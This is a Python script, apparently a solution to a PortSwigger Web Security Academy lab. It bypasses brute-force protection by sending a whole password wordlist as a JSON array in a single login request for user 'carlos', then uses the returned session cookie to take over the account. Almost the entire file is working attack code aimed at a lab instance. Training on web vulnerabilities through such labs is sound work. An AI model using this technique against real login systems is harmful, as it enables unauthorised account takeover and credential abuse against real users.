###########################################################################
#
# Author: Ahmed Elqalawy (@elqal3awii)
#
# Date: 30/8/2023
#
# Lab: Broken brute-force protection, multiple credentials per request
#
# Steps: 1. Send multiple passwords in the same login request
#        2. Obtain the new session from cookie header
#        3. Login as carlos with the new session
#
###########################################################################

###########
# imports
###########
import requests
import re
from colorama import Fore
import base64

# change this url to your lab
url = "https://0a6200ae03689c69807a45420018005f.web-security-academy.net"
passwords = open("/home/ahmed/passwords",
                 'rt').read().splitlines()

###############################
# Starting point of the script
###############################
try:
    json = {
        "username": "carlos",
        "password": passwords
    }
    print(Fore.WHITE +
          "[*] Sending multiple credentials in the same request..☑️")
    # send multiple passwords in one request
    res = requests.post(f"{url}/login", json=json, allow_redirects=False)
    if res.status_code == 302:  # if a redirect is happened; means that a valid password is exist
        # extract session form the cookie header
        session = res.cookies.get("session")
        headers = {
            "Cookie": f"session={session}"
        }
        # get the home page with obtained session
        home = requests.get(f"{url}/my-account?id=carlos", headers=headers)
        # search for a pattern to make sure you logged in as carlos
        is_carlos = re.findall("Your username is: carlos", home.text)
        if len(is_carlos) != 0:  # if the patter is found
            print(Fore.WHITE + "✅ Successfully logged in as " +
                  Fore.GREEN + "carlos")
            print(Fore.WHITE + "[#] Use this " + Fore.GREEN + session +
                  Fore.WHITE + " session in your browser to login as carlos")
        else:
            print(Fore.RED + "Failed to login")
    else:
        print(Fore.RED + "Failed to login")
except:
    print(Fore.RED + "Failed to send login request through exception")
